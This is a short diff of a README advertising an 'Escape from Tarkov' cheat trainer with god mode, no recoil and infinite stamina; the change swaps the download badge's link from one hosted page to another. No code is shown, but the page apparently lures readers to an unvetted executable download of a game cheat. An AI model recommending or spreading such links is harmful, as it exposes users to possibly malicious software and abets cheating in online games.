@@ -2,7 +2,7 @@
 
 **Tired of dying to campers, broken limbs, and slow healing? With a Tarkov trainer, you can flip the survival script. Toggle God Mode, no recoil, XP boosts, infinite stamina, and become the true boss of the raid — solo or squad.**
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Tarkov-Trainer-zara3.github.io/.github)
 ---
 
 ## 🎯 What is a Tarkov Trainer?
